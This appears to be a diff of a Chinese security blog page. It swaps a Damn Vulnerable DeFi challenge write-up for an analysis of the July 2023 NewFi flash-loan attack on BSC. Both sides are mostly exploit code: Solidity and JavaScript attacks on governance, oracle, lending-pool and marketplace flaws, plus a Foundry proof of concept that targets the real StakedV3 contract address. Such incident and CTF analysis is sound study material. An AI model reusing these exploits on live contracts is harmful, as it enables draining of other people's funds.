@@ -4,9 +4,9 @@
 
 <head>
     <meta charset="utf-8">
-    <meta name="keywords" content="Damn Defi 题解（中）, Blog">
-    <meta name="description" content="Damn Defi 题解(中)selfi一个提供DVT代币的闪电贷，池中有一百五十万个DVT。我们身无分文，但是我们需要拿走全部的DVT。这个题和以往的题唯一不同的地方，就是多了一个治理机制。
-SelfiePool：这个池里有一个闪电贷的函">
+    <meta name="keywords" content="20230717 NewFi, Blog">
+    <meta name="description" content="攻击介绍2023年7月17日，bscscan链上的NewFi被黑客攻击，一共损失了价值31k$的BUSD。
+攻击分析我们使用phalcon进行分析，通过phalcon的调用栈分析，可以看到攻击者首先从4个池子贷了大量的BUSD，然后在Pan">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
     <meta name="renderer" content="webkit|ie-stand|ie-comp">
@@ -18,7 +18,7 @@ SelfiePool：这个池里有一个闪电贷的函">
     <!-- Global site tag (gtag.js) - Google Analytics -->
 
 
-    <title>Damn Defi 题解（中） | Blog</title>
+    <title>20230717 NewFi | Blog</title>
     <link rel="icon" type="image/png" href="/favicon.png">
     
     <style>
@@ -288,7 +288,7 @@ SelfiePool：这个池里有一个闪电贷的函">
         <div class="row">
             <div class="col s12 m12 l12">
                 <div class="brand">
-                    <h1 class="description center-align post-title">Damn Defi 题解（中）</h1>
+                    <h1 class="description center-align post-title">20230717 NewFi</h1>
                 </div>
             </div>
         </div>
@@ -312,8 +312,8 @@ SelfiePool：这个池里有一个闪电贷的函">
                     
                     <div class="article-tag">
                         
-                            <a href="/tags/%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6%E5%AE%89%E5%85%A8/">
-                                <span class="chip bg-color">智能合约安全</span>
+                            <a href="/tags/%E6%94%BB%E5%87%BB%E4%BA%8B%E4%BB%B6/">
+                                <span class="chip bg-color">攻击事件</span>
                             </a>
                         
                     </div>
@@ -324,8 +324,8 @@ SelfiePool：这个池里有一个闪电贷的函">
                     <div class="post-cate">
                         <i class="fas fa-bookmark fa-fw icon-category"></i>
                         
-                            <a href="/categories/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%AE%89%E5%85%A8/" class="post-category">
-                                区块链安全
+                            <a href="/categories/%E6%94%BB%E5%87%BB%E4%BA%8B%E4%BB%B6/" class="post-category">
+                                攻击事件
                             </a>
                         
                     </div>
@@ -337,28 +337,28 @@ SelfiePool：这个池里有一个闪电贷的函">
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
-                    2023-02-25
+                    2023-10-26
                 </div>
                 
 
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-check fa-fw"></i>更新日期:&nbsp;&nbsp;
-                    2023-03-09
+                    2023-10-31
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    1.3k
+                    482
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-clock fa-fw"></i>阅读时长:&nbsp;&nbsp;
-                    5 分
+                    2 分
                 </div>
                 
 
@@ -378,146 +378,97 @@ SelfiePool：这个池里有一个闪电贷的函">
 
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <h1 id="Damn-Defi-题解-中"><a href="#Damn-Defi-题解-中" class="headerlink" title="Damn Defi 题解(中)"></a>Damn Defi 题解(中)</h1><h2 id="selfi"><a href="#selfi" class="headerlink" title="selfi"></a>selfi</h2><p>一个提供DVT代币的闪电贷，池中有一百五十万个DVT。我们身无分文，但是我们需要拿走全部的DVT。<br>这个题和以往的题唯一不同的地方，就是多了一个治理机制。</p>
-<p>SelfiePool：这个池里有一个闪电贷的函数，同时有一个可以转出所有资金的函数drainAllFunds()，但是只能被治理合约所调用。</p>
-<p>SimpleGovernance：这就是之前提到的治理合约，queueAction函数会验证你是否拥有足够的token，当你拥有了矿池中半数以上的DVT代币后（我们现在有闪借池，这点很容易绕过），在两天之后输入你的id即可在executeAction中执行该调用。</p>
-<p>很明显，我们可以通过executeAction函数中去执行闪电贷合约中的drainAllFunds函数，即可绕开onlyGovernance的限定。</p>
-<h3 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h3><pre class=" language-1"><code class="language-1">pragma solidity ^0.8.0;
+                <h1 id="攻击介绍"><a href="#攻击介绍" class="headerlink" title="攻击介绍"></a>攻击介绍</h1><p>2023年7月17日，bscscan链上的NewFi被黑客攻击，一共损失了价值31k$的BUSD。</p>
+<h1 id="攻击分析"><a href="#攻击分析" class="headerlink" title="攻击分析"></a>攻击分析</h1><p>我们使用<a target="_blank" rel="noopener" href="https://explorer.phalcon.xyz/tx/bsc/0x557628123d137ea49564e4dccff5f5d1e508607e96dd20fe99a670519b679cb5">phalcon</a>进行分析，通过phalcon的调用栈分析，可以看到攻击者首先从4个池子贷了大量的BUSD，然后在PancakeSwap: Smart Router V3中通过以质押与回收BUSD从中套了31,099的BUSD。分析StakedV3.Invest()的调用栈，发现sqrtPriceX96从456917351256涨到了396517633895，显然攻击者通过StakedV3的Invest()方法操纵了价格。</p>
+<h1 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h1><pre><code>// SPDX-License-Identifier: UNLICENSED
+pragma solidity ^0.8.10;
 
-import "./SimpleGovernance.sol";
-import "./SelfiePool.sol";
-import "../DamnValuableTokenSnapshot.sol";
+import "forge-std/Test.sol";
+import "./interface.sol";
 
-contract SelfieExploit {
+// Vulnerable Contract : 0xb8dc09eec82cab2e86c7edc8dd5882dd92d22411
+// Attack Tx : 0x557628123d137ea49564e4dccff5f5d1e508607e96dd20fe99a670519b679cb5
 
-    SimpleGovernance public goverance;
-    SelfiePool public pool;
-    address attcker;
-    uint256 actionId;
-    constructor(address _pool, address _goverance){
-        pool = SelfiePool(_pool);
-        goverance = SimpleGovernance(_goverance);
-        attcker = msg.sender;
-    }
-
-    function exploit (uint256 _amount) public {
-        pool.flashLoan(_amount);
-    }
-
-    function receiveTokens (address _token, uint256 amount) external {
-        DamnValuableTokenSnapshot token = DamnValuableTokenSnapshot(_token);
-        token.snapshot();
-        actionId = goverance.queueAction(address(pool),
-            abi.encodeWithSignature(
-                "drainAllFunds(address)",
-                attcker
-            ),
-            0); 
-        token.transfer(address(pool), amount);
-    }
-
-    function drainToAttacker() external {
-        goverance.executeAction(actionId);
-    }
-
-    receive () external payable {}
+interface IStakedV3 {
+    function Invest(
+        uint256 id,
+        uint256 amount,
+        uint256 quoteAmount,
+        uint256 investType,
+        uint256 cycle,
+        uint256 deadline
+    ) external payable;
 }
-</code></pre>
-<h2 id="Compromised"><a href="#Compromised" class="headerlink" title="Compromised"></a>Compromised</h2><p>一个交易所在售卖一种代币DVNFT，每个价值999ETH，要我们以0.1ETH的余额来拿走交易所中全部的ETH。</p>
-<p> Exchange：一个简单的交易所。</p>
-<p> TrustfulOracle：一个预言机合约。这个预言机值得我们仔细阅读。这个预言机合约几乎提供了所有的可以修改价格的函数，报告者通过postPrice()来设定自己的价格，而getMedianPrice()是交易所来获取三个可信者定价中位数的函数，并以此来作为该交易的价格。因为只有初始化的三个可信报告者可以定价，所以我们如果能够控制这2个地址，就能够随意的更改价格。</p>
-<p> 题目中给的两串十六进制数，先用ascii码转化，再用base64解码就可以得到三个账户中其中两个的私钥。<br>0xc678ef1aa456da65c6fc5861d44892cdfac0c6c8c2560bf0c9fbcdae2f4735a9<br>0x208242c40acdfa9ed889e685c23547acbed9befc60371e9875fbcd736340bb48</p>
-<h3 id="Exploit-1"><a href="#Exploit-1" class="headerlink" title="Exploit"></a>Exploit</h3><pre class=" language-1"><code class="language-1">it('Exploit', async function () {        
-       /** CODE YOUR EXPLOIT HERE */
-       //用二者私钥创建钱包
-       const sources1 = new ethers.Wallet("0xc678ef1aa456da65c6fc5861d44892cdfac0c6c8c2560bf0c9fbcdae2f4735a9", ethers.provider);
-       const sources2 = new ethers.Wallet("0x208242c40acdfa9ed889e685c23547acbed9befc60371e9875fbcd736340bb48", ethers.provider);
 
-       //将NFT价格设置为1wei
-       await this.oracle.connect(sources1).postPrice("DVNFT", 1);
-       await this.oracle.connect(sources2).postPrice("DVNFT", 1);
+contract ContractTest is Test {
+    IERC20 BUSD = IERC20(0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56);
+    IERC20 USDT = IERC20(0x55d398326f99059fF775485246999027B3197955);
+    Uni_Router_V3 Router = Uni_Router_V3(0x13f4EA83D0bd40E75C8222255bc855a974568Dd4);
+    Uni_Pair_V3 Pair1 = Uni_Pair_V3(0x22536030B9cE783B6Ddfb9a39ac7F439f568E5e6);
+    Uni_Pair_V3 Pair2 = Uni_Pair_V3(0x85FAac652b707FDf6907EF726751087F9E0b6687);
+    Uni_Pair_V3 Pair3 = Uni_Pair_V3(0x369482C78baD380a036cAB827fE677C1903d1523);
+    IStakedV3 StakedV3 = IStakedV3(0xB8dC09Eec82CaB2E86C7EdC8DD5882dd92d22411);
 
-       //买入
-       await this.exchange.connect(attacker).buyOne({value:1});
+    function setUp() public {
+        vm.createSelectFork("bsc", 30_043_573);
+        vm.label(address(BUSD), "BUSD");
+        vm.label(address(USDT), "USDT");
+        vm.label(address(Router), "Router");
+        vm.label(address(Pair1), "Pair1");
+        vm.label(address(Pair2), "Pair2");
+        vm.label(address(StakedV3), "StakedV3");
+    }
 
-       //重新将价格设置为exchange合约的总余额
-       _balance =  ethers.provider.getBalance(this.exchange.address);
-       await this.oracle.connect(sources1).postPrice("DVNFT", _balance);
-       await this.oracle.connect(sources2).postPrice("DVNFT", _balance);
+    function testExploit() public {
+        USDT.approve(address(Router), type(uint256).max);
+        BUSD.approve(address(Router), type(uint256).max);
+        BUSD.approve(address(StakedV3), type(uint256).max);
+        BUSD.approve(address(StakedV3), type(uint256).max);
+        Pair1.flash(address(this), 0, BUSD.balanceOf(address(Pair1)), abi.encode(BUSD.balanceOf(address(Pair1))));
 
-       //卖出
-       await this.nftToken.connect(attacker).approve(this.exchange.address, 0);
-       await this.exchange.connect(attacker).sellOne(0);
-   });
-</code></pre>
-<h2 id="Puppet"><a href="#Puppet" class="headerlink" title="Puppet"></a>Puppet</h2><p> 有一个借贷池在借贷DVT，池中有十万DYT,题直接通过abi引用了一个已经编译了的Uniswap v1的合约,我们需要以25ETH和1000DVT的余额拿走借贷池中的所有代币。</p>
-<p> 写这题我们先要了解Uniswap v1。可以看看这个<a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/552867213">传送门</a>。</p>
-<p> 在了解了uniswap v1后，我们就应该知道，题中没有足够多的流动性来应对大规模的买进卖出。因此我们只需要出售我们手中所有的token，就会导致市场崩盘，价格失衡。(token大幅度贬值)，那么我们手中的ETH将会非常值钱，这时候我们再调用borrow函数，由于token的贬值，我们可以通过抵押我们手中的ETH获得几乎全部的token。</p>
-<h3 id="Exploit-2"><a href="#Exploit-2" class="headerlink" title="Exploit"></a>Exploit</h3><pre class=" language-1"><code class="language-1">it('Exploit', async function () {
-      await this.token.connect(attacker).approve(this.uniswapRouter.address, ATTACKER_INITIAL_TOKEN_BALANCE);
-      // 在交易所置换自己所有的token
-      await this.uniswapRouter.connect(attacker).swapExactTokensForETH(
-          ATTACKER_INITIAL_TOKEN_BALANCE,
-          0,
-          [this.token.address, this.uniswapRouter.WETH()],
-          attacker.address,
-          9999999999
-      );
-      
-      console.log('Attacker`s balance:', (await ethers.provider.getBalance(attacker.address)).toString());
-      //计算borrow所有token所需要的eth
-      const amount = await this.lendingPool.calculateDepositOfWETHRequired(POOL_INITIAL_TOKEN_BALANCE);
-      //先往钱包里存钱
-      await this.weth.connect(attacker).deposit({value:amount});
-      await this.weth.connect(attacker).approve(this.lendingPool.address, amount);
-      await this.lendingPool.connect(attacker).borrow(POOL_INITIAL_TOKEN_BALANCE);
-  });
-</code></pre>
-<h2 id="Puppet-V2"><a href="#Puppet-V2" class="headerlink" title="Puppet V2"></a>Puppet V2</h2><p>这次题目采用了uniswapv2，我们有20ETH和10000DVT代币，需要我们讲借贷池中的100万DVT代币全部拿走。</p>
-<p>这题虽然用了uniswapv2，但是和上一题差别不大。思路也一样。</p>
-<h3 id="Exploit-3"><a href="#Exploit-3" class="headerlink" title="Exploit"></a>Exploit</h3><pre class=" language-1"><code class="language-1">it('Exploit', async function () {
-       await this.token.connect(attacker).approve(this.uniswapRouter.address, ATTACKER_INITIAL_TOKEN_BALANCE);
-       // 在交易所置换自己所有的token
-       await this.uniswapRouter.connect(attacker).swapExactTokensForETH(
-           ATTACKER_INITIAL_TOKEN_BALANCE,
-           0,
-           [this.token.address, this.uniswapRouter.WETH()],
-           attacker.address,
-           9999999999
-       );
-       
-       console.log('Attacker`s balance:', (await ethers.provider.getBalance(attacker.address)).toString());
-       //计算borrow所有token所需要的eth
-       const amount = await this.lendingPool.calculateDepositOfWETHRequired(POOL_INITIAL_TOKEN_BALANCE);
-       //先往钱包里存钱
-       await this.weth.connect(attacker).deposit({value:amount});
-       await this.weth.connect(attacker).approve(this.lendingPool.address, amount);
-       await this.lendingPool.connect(attacker).borrow(POOL_INITIAL_TOKEN_BALANCE);
-   });
-</code></pre>
-<h2 id="Free-Rider"><a href="#Free-Rider" class="headerlink" title="Free Rider"></a>Free Rider</h2><p>题目要求我们偷走买家的的45个ETH，并且还要市场失去一些比特币。</p>
-<p>本题的关键就是这2串代码</p>
-<pre class=" language-1"><code class="language-1">_token.safeTransferFrom(_token.ownerOf(tokenId), msg.sender, tokenId);
- payable(_token.ownerOf(tokenId)).sendValue(priceToPay);
-</code></pre>
-<p> 这存在很明显的逻辑漏洞。在nft从owner转给我们之后，再将用于购买的eth又发给了代币拥有者，但这时的代币拥有者已经变成了买家，所以等于买家没花任何钱就买到了nft。</p>
-<h3 id="Exploit-4"><a href="#Exploit-4" class="headerlink" title="Exploit"></a>Exploit</h3><pre class=" language-1"><code class="language-1">it('Exploit', async function () {
-       const AttackFactory = await ethers.getContractFactory("AttackFreeRider", attacker);
-       const attackContract = await AttackFactory.deploy(
-           this.weth.address, 
-           this.uniswapFactory.address,
-           this.token.address,
-           this.marketplace.address,
-           this.buyerContract.address,
-           this.nft.address,
-           );
+        emit log_named_decimal_uint(
+            "Attacker BUSD balance after exploit", BUSD.balanceOf(address(this)), BUSD.decimals()
+            );
+    }
 
-       await attackContract.flashSwap(this.weth.address, NFT_PRICE, {
-           gasLimit: 1e6
-       });
+    function pancakeV3FlashCallback(uint256 amount0, uint256 amount1, bytes calldata data) external {
+        if (msg.sender == address(Pair1)) {
+            Pair2.flash(address(this), 0, BUSD.balanceOf(address(Pair2)), abi.encode(BUSD.balanceOf(address(Pair2))));
+            uint256 repayAmount = abi.decode(data, (uint256));
+            BUSD.transfer(address(Pair1), repayAmount + amount1);
+        } else if (msg.sender == address(Pair2)) {
+            Pair3.flash(address(this), 0, BUSD.balanceOf(address(Pair3)), abi.encode(BUSD.balanceOf(address(Pair3))));
+            uint256 repayAmount = abi.decode(data, (uint256));
+            BUSD.transfer(address(Pair2), repayAmount + amount1);
+        } else if (msg.sender == address(Pair3)) {
+            BUSDToUSDT();
+            StakedV3.Invest(2, 1 ether, 2, 1, 7, block.timestamp + 1000); // remove liquidity and swap BUSD to USDT
+            USDTToBUSD();
+            uint256 repayAmount = abi.decode(data, (uint256));
+            BUSD.transfer(address(Pair3), repayAmount + amount1);
+        }
+    }
 
+    function BUSDToUSDT() internal {
+        bytes memory path = abi.encodePacked(address(BUSD), uint24(100), address(USDT));
+        address recipient = address(this);
+        uint256 amountIn = 12_000_000 ether;
+        uint256 amountOutMinimum = 0;
+        Uni_Router_V3.ExactInputParams memory ExactInputParams =
+            Uni_Router_V3.ExactInputParams(path, recipient, amountIn, amountOutMinimum);
+        Router.exactInput(ExactInputParams);
+    }
 
-   });
+    function USDTToBUSD() internal {
+        bytes memory path = abi.encodePacked(address(USDT), uint24(100), address(BUSD));
+        address recipient = address(this);
+        uint256 amountIn = USDT.balanceOf(address(this));
+        uint256 amountOutMinimum = 0;
+        Uni_Router_V3.ExactInputParams memory ExactInputParams =
+            Uni_Router_V3.ExactInputParams(path, recipient, amountIn, amountOutMinimum);
+        Router.exactInput(ExactInputParams);
+    }
+}
 </code></pre>
 
                 
@@ -545,7 +496,7 @@ contract SelfieExploit {
                     </i>
                 </span>
                 <span class="reprint-info">
-                    <a href="https://willcking.github.io/2023/02/25/Damn-Defi-%E9%A2%98%E8%A7%A3%20%EF%BC%88%E4%B8%AD%EF%BC%89/">https://willcking.github.io/2023/02/25/Damn-Defi-%E9%A2%98%E8%A7%A3%20%EF%BC%88%E4%B8%AD%EF%BC%89/</a>
+                    <a href="https://willcking.github.io/2023/10/26/20230717-NewFi/">https://willcking.github.io/2023/10/26/20230717-NewFi/</a>
                 </span>
             </div>
             <div class="reprint__notice">
@@ -583,8 +534,8 @@ contract SelfieExploit {
                     
                         <div class="article-tag">
                             
-                                <a href="/tags/%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6%E5%AE%89%E5%85%A8/">
-                                    <span class="chip bg-color">智能合约安全</span>
+                                <a href="/tags/%E6%94%BB%E5%87%BB%E4%BA%8B%E4%BB%B6/">
+                                    <span class="chip bg-color">攻击事件</span>
                                 </a>
                             
                         </div>
@@ -663,17 +614,18 @@ contract SelfieExploit {
 <article id="prenext-posts" class="prev-next articles">
     <div class="row article-row">
         
-        <div class="article col s12 m6" data-aos="fade-up">
+        <div class="article col s12 m6" data-aos="fade-up" data-aos="fade-up">
             <div class="article-badge left-badge text-color">
-                <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
+                <i class="far fa-dot-circle"></i>&nbsp;本篇
+            </div>
             <div class="card">
-                <a href="/2023/03/09/Mr%20Steal%20Yo%20Crypto-%E4%B8%8B/">
+                <a href="/2023/10/26/20230717-NewFi/">
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/11.jpg" class="responsive-img" alt="Mr Steal Yo Crypto-下">
+                        <img src="/medias/featureimages/7.jpg" class="responsive-img" alt="20230717 NewFi">
                         
-                        <span class="card-title">Mr Steal Yo Crypto-下</span>
+                        <span class="card-title">20230717 NewFi</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
@@ -683,26 +635,27 @@ contract SelfieExploit {
                         
                     </div>
                     <div class="publish-info">
-                        <span class="publish-date">
-                            <i class="far fa-clock fa-fw icon-date"></i>2023-03-09
-                        </span>
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2023-10-26
+                            </span>
                         <span class="publish-author">
                             
                             <i class="fas fa-bookmark fa-fw icon-category"></i>
                             
-                            <a href="/categories/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%AE%89%E5%85%A8/" class="post-category">
-                                    区块链安全
+                            <a href="/categories/%E6%94%BB%E5%87%BB%E4%BA%8B%E4%BB%B6/" class="post-category">
+                                    攻击事件
                                 </a>
                             
                             
                         </span>
                     </div>
                 </div>
+
                 
                 <div class="card-action article-tags">
                     
-                    <a href="/tags/%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6%E5%AE%89%E5%85%A8/">
-                        <span class="chip bg-color">智能合约安全</span>
+                    <a href="/tags/%E6%94%BB%E5%87%BB%E4%BA%8B%E4%BB%B6/">
+                        <span class="chip bg-color">攻击事件</span>
                     </a>
                     
                 </div>
@@ -716,13 +669,13 @@ contract SelfieExploit {
                 下一篇&nbsp;<i class="fas fa-chevron-right"></i>
             </div>
             <div class="card">
-                <a href="/2023/02/24/Damn-Defi-%E9%A2%98%E8%A7%A3%EF%BC%88%E4%B8%8A%EF%BC%89/">
+                <a href="/2023/10/13/20230724-Palmswap/">
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/2.jpg" class="responsive-img" alt="Damn Defi 题解（上）">
+                        <img src="/medias/featureimages/5.jpg" class="responsive-img" alt="20230724 Palmswap">
                         
-                        <span class="card-title">Damn Defi 题解（上）</span>
+                        <span class="card-title">20230724 Palmswap</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
@@ -733,14 +686,14 @@ contract SelfieExploit {
                     </div>
                     <div class="publish-info">
                             <span class="publish-date">
-                                <i class="far fa-clock fa-fw icon-date"></i>2023-02-24
+                                <i class="far fa-clock fa-fw icon-date"></i>2023-10-13
                             </span>
                         <span class="publish-author">
                             
                             <i class="fas fa-bookmark fa-fw icon-category"></i>
                             
-                            <a href="/categories/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%AE%89%E5%85%A8/" class="post-category">
-                                    区块链安全
+                            <a href="/categories/%E6%94%BB%E5%87%BB%E4%BA%8B%E4%BB%B6/" class="post-category">
+                                    攻击事件
                                 </a>
                             
                             
@@ -750,8 +703,8 @@ contract SelfieExploit {
                 
                 <div class="card-action article-tags">
                     
-                    <a href="/tags/%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6%E5%AE%89%E5%85%A8/">
-                        <span class="chip bg-color">智能合约安全</span>
+                    <a href="/tags/%E6%94%BB%E5%87%BB%E4%BA%8B%E4%BB%B6/">
+                        <span class="chip bg-color">攻击事件</span>
                     </a>
                     
                 </div>
